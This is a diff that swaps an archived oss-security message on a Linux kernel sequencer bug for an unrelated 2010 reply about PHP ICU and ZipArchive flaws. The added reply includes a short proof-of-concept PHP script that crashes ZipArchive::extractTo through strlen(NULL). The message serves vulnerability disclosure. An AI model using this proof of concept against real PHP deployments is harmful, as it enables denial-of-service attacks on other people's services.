@@ -1,23 +1,35 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2010/09/08/7
-Message-ID: <4C874E7C.5070904@redhat.com>
-Date: Wed, 08 Sep 2010 16:51:08 +0800
-From: Eugene Teo <eugene@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2010/12/07/5
+Message-ID: <loom.20101207T233636-664@post.gmane.org>
+Date: Tue, 7 Dec 2010 22:43:17 +0000 (UTC)
+From: Maksymilian Arciemowicz <cxib@...urityreason.com>
 To: oss-security@...ts.openwall.com
-CC: "Steven M. Christey" <coley@...us.mitre.org>
-Subject: CVE-2010-3080 kernel: /dev/sequencer open failure is not handled correctly
+Subject: Re: CVE request (PHP 5.3.x getSymbol() DoS; CERT VU#479900)
 Content-Type: text/plain; charset=utf-8
 
-Reported by Tavis Ormandy. There's a bug in snd_seq_oss_open from 
-sound/core/seq/oss/seq_oss_init.c that can result in dereferencing of a 
-released pointer. On some distros like Red Hat Enterprise Linux 5, 
-/dev/sequencer is restricted to root owner only. On others like Fedora 
-13, it cannot be accessed by a local, unprivileged user unless someone 
-logs in from the console on his/her behalf.
+Tomas Hoger <thoger@...> writes:
 
-https://bugzilla.redhat.com/CVE-2010-3080
-http://git.kernel.org/?p=linux/kernel/git/tiwai/sound-2.6.git;a=commitdiff;h=c598337660c21c0afaa9df5a65bb4a7a0cf15be8
+> Btw, setSymbol() is affected too, and does not seem to be addressed in
+> r305571.  In both cases, it's PHP exposing ICU bug.
+> 
 
-Thanks, Eugene
--- 
-main(i) { putchar(182623909 >> (i-1) * 5&31|!!(i<7)<<6) && main(++i); }
+
+setSymbol() give only DoS with strlen(NULL) [CWE-170].
+getSymbol() Integer overflow which causes heap overflow.
+
+see also ZipArchive:extractTo()
+Possible CWE-170 strlen(NULL)
+
+PoC:
+<?php
+
+$zip = new ZipArchive;
+$zip->open('./dupa.zip');
+var_dump($zip->extractTo('/tmp', array('', '')));
+
+
+?>
+
+Fix:
+http://svn.php.net/viewvc/php/php-src/branches/PHP_5_3/ext/zip/php_zip.c?view=log
+
